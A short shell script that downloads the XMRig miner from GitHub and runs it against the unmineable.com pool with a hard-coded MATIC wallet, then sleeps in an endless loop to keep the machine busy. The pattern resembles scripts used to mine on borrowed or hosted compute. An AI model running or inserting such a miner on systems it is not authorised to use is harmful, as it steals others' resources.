#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar -xvf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u MATIC:0xc4bf8c620712316f0ff7Df3E438DE6b2Bbcb9A94.MATIC001 -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 9999
